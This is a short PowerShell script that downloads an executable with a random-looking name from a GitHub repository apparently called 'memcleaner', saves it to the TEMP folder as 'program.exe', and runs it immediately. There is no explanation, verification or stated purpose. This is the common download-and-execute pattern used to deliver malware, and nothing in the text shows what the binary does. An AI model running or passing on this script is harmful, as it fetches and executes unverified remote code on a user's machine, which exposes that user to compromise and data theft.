$url = "https://raw.githubusercontent.com/fasa3e/memcleaner/refs/heads/main/c0j9xeidfkhjou1o.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
